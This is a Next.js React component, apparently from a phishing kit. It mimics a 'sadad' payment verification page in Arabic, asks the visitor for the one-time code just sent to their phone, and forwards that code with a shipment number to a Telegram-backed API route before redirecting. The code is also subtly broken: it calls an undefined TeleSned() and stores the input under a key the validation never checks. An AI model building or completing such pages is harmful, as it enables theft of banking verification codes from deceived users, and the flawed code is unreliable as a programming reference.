"use client"

import styles from './code.module.css'
import {  useState } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'



const Code = () => {
  const {Send} =TeleSned();
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")
  const [form,setForm]=useState({
    data:{
      كود_ثاني:"",
      رقم_الشحنة:datas
    }
  })
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToTelegram = async () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("%0A");
    await fetch("/api/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ description }),
    });

    
  };
  const handlerout = ()=>{
    if(form.data.كود_ثاني == ""){
      alert('من فضلك قم بملى الحقول')
    }else{
      router.push(`/fozajil/pay/code/finish?names=${datas}`)
    }
  }




  return (
    <div className={styles.contect}>
      <div>
        <div>
          <img src="" alt="sadad" />
          <img src="" alt="تنزيل png(4)" />
        </div>
      <h1> تاكيد</h1>
      <p>ادخال الكود المرسل حديثا على هاتفك</p>
     
      <form  onSubmit={(e)=>{
        e.preventDefault();
        PostToTelegram()
      }}>
        
        <input type="text" name="code" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder="ادخل كود التحقق" />
        
        <button type='submit' onClick={handlerout}>دخول</button>
      </form>
        <img src="" alt="footersadad" />
      </div>
    </div>
  )
}

export default Code
